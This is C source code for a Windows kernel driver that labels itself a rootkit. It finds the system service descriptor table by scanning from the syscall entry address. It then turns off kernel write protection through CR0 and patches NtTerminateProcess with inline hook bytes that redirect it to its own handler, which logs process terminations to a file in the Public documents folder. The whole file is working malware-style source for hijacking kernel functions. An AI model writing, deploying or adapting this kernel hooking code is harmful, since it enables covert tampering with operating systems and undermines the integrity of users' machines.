#include <ntddk.h>
#include <wdm.h>
#include <string.h>
#include "P4tch3r.h"
#include <ntstrsafe.h>

#define LOGGING

ULONGLONG NtTerminateAddr;
PSYSTEM_SERVICE_TABLE KeServiceDescriptorTable;
UCHAR nt_payload[] = { 0x48, 0xB8, /*0x41 - calling address*/0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41/**/, 0xff, 0xd0 };

void FixKernel(void);
extern void a_handle(void);
extern void getret(void);

PHANDLE thread;
BOOLEAN mutex = FALSE;

NtTerminateProcessArgs NtTArgs;

UNICODE_STRING file_path;
HANDLE file;
OBJECT_ATTRIBUTES obj_attrs;
IO_STATUS_BLOCK io_status_block;

VOID Unload(PDRIVER_OBJECT DriverObj)
{
	FixKernel();
#ifdef LOGGING
	ZwClose(thread);
#endif
	DbgPrint("ROOTKIT UNLOAD\r\n");
}

KIRQL WriteProtectOFF(void)
{
	KIRQL irql = KeRaiseIrqlToDpcLevel();
	UINT64 cr0 = __readcr0();
	cr0 &= 0xfffffffffffeffff;
	__writecr0(cr0);
	_disable();
	return irql;
}

void WriteProtectON(KIRQL irql)
{
	UINT64 cr0 = __readcr0();
	cr0 |= 0x10000;
	_enable();
	__writecr0(cr0);
	KeLowerIrql(irql);
}

ULONGLONG GetKeServiceDescriptorTableAddr(void)
{
	PUCHAR s_search = (PUCHAR)__readmsr(0xC0000082); // kernel's rip for syscall (long mode)
	PUCHAR last_search_addr = s_search + 0x500;
	PUCHAR i = NULL;
	UCHAR b1 = 0, b2 = 0, b3 = 0;
	ULONGLONG templong = 0;
	ULONGLONG addr = 0;
	for (i = s_search; i < last_search_addr; i++)
	{
		if (MmIsAddressValid(i) && MmIsAddressValid(i + 1) && MmIsAddressValid(i + 2))
		{
			b1 = *(i);
			b2 = *(i + 1);
			b3 = *(i + 2);
			if (b1 == 0x4c && b2 == 0x8d && b3 == 0x15)
			{
				memcpy(&templong, i + 3, 4);
				addr = (ULONGLONG)templong + (ULONGLONG)i + 7;
				break;
			}
		}
	}
	return addr;
}

ULONGLONG GetSSDTFunction(ULONG index)
{
	LONG dwtmp = 0;
	ULONGLONG addr = 0;
	PULONG service_table_base = NULL;
	service_table_base = (PULONG)KeServiceDescriptorTable->ServiceTableBase;
	dwtmp = service_table_base[index];
	dwtmp = dwtmp >> 4;
	addr = ((LONGLONG)dwtmp + (ULONGLONG)service_table_base);
	return addr;
}

VOID ThreadWrite(PVOID context)
{
	KeSetPriorityThread(KeGetCurrentThread(), HIGH_PRIORITY);
	long long handle = NtTArgs.hProcess;
	int exit_code = NtTArgs.uExitCode;
	mutex = TRUE;
	PDEVICE_OBJECT DeviceObj = context;
	unsigned char buff[0x100];
	sprintf_s(buff, 0x100, "NtTerminateProcess(0x%llx, 0x%x)\r\n", handle, exit_code);
	ULONG buff_sz = strlen(buff);

	RtlInitUnicodeString(&file_path, L"\\DosDevices\\C:\\Users\\Public\\Documents\\P4tch3r.txt");
	InitializeObjectAttributes(&obj_attrs, &file_path, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

	ZwOpenFile(&file, FILE_APPEND_DATA | SYNCHRONIZE, &obj_attrs, &io_status_block, 0, /*FILE_WRITE_THROUGH |*/ FILE_SYNCHRONOUS_IO_NONALERT | FILE_SEQUENTIAL_ONLY | FILE_NON_DIRECTORY_FILE);

	ZwWriteFile(file, NULL, NULL, NULL, &io_status_block, (PVOID)buff, buff_sz, NULL, NULL);

	ZwClose(file);
}

void __fastcall Handler(long long handle, int exit_code)
{
#ifdef LOGGING
	//DbgPrint(">>>> called: NtTerminateProcess(0x%llx, 0x%x)\r\n", handle, exit_code);
	NtTArgs.hProcess = handle;
	NtTArgs.uExitCode = exit_code;
	mutex = FALSE;
	PsCreateSystemThread(&thread, THREAD_ALL_ACCESS, NULL, NULL, NULL, &ThreadWrite, NULL);
	while (!mutex) // maybe it's not that good as I expect ;)
		continue;
	//ZwClose(test_thread);
#endif
}

VOID MemProtCpy(PVOID destination, UCHAR* source, size_t size)
{
	KIRQL irql = WriteProtectOFF();
	RtlCopyMemory(destination, source, size);
	WriteProtectON(irql);
}

VOID FixKernel(void)
{
	UCHAR payload[] = {0x49, 0x89, 0xE3, 0x49, 0x89, 0x5B, 0x18, 0x89, 0x54, 0x24, 0x10, 0x55, 0x56};
	UCHAR _payload[] = { 0x48, 0x8b, 0x9c, 0x24, 0x90, 00, 00, 00, 0x48, 0x83, 0xc4, 0x40 };

	MemProtCpy((PVOID)NtTerminateAddr, payload, sizeof(payload));
	MemProtCpy((PVOID)(NtTerminateAddr+0x151), _payload, sizeof(_payload));
}

VOID Patch(ULONGLONG nt_addr, ULONGLONG func_addr)
{
	int addr_c = 0;
	for (int j = 2; j <= 9; j++)
	{
		nt_payload[j] = BYTE((unsigned long long)func_addr, addr_c);
		addr_c++;
	}
	MemProtCpy((PVOID)nt_addr, nt_payload, sizeof(nt_payload));
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObj, PIRP IRP)
{
	DriverObj->DriverUnload = Unload;

	KeServiceDescriptorTable = (PSYSTEM_SERVICE_TABLE)GetKeServiceDescriptorTableAddr();
	NtTerminateAddr = GetSSDTFunction(41);
	
	ULONGLONG(*test)() = &a_handle;
	ULONGLONG(*pgetret)() = &getret;
	
	Patch(NtTerminateAddr, test);
	Patch(NtTerminateAddr+0x151, pgetret);

	DbgPrint("ROOTKIT LOAD\r\n");

	return STATUS_SUCCESS;
}